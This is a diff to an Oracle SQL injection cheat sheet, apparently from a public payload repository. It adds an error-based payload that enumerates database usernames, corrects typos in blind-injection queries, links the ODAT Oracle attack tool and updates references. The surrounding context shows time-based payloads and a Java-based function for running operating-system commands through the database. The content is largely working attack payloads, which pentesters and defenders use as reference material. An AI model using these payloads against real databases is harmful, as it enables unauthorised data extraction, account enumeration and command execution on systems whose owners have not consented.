@@ -58,6 +58,8 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 | Invalid XPath         | SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual |
 | Invalid XML           | SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual |
 | Invalid XML           | SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users |
+| SQL Error             | SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) |
+
 
 ## Oracle SQL Blind
 
@@ -66,8 +68,8 @@ SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
 | Version is 12.2	       | SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%'; |
 | Subselect is enabled	 | SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual) |
 | Table log_table exists | SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table); |
-| Column message exists in table log_table | SELEC COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; |
-| First letter of first message is t | SELEC message FROM log_table WHERE rownum=1 AND message LIKE 't%'; |
+| Column message exists in table log_table | SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE'; |
+| First letter of first message is t | SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%'; |
 
 ## Oracle SQL Time based
 
@@ -76,6 +78,8 @@ AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])                
 ```
 
 ## Oracle SQL Command execution
+
+* [ODAT (Oracle Database Attacking Tool)](https://github.com/quentinhardy/odat)
 
 ```sql
 /* create Java class */
@@ -106,4 +110,5 @@ SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
 
 ## References
 
-* [Heavily taken inspired by - NetSpi SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+* [NetSpi - SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
+* [ASDC12 - New and Improved Hacking Oracle From Web](https://owasp.org/www-pdf-archive/ASDC12-New_and_Improved_Hacking_Oracle_From_Web.pdf)
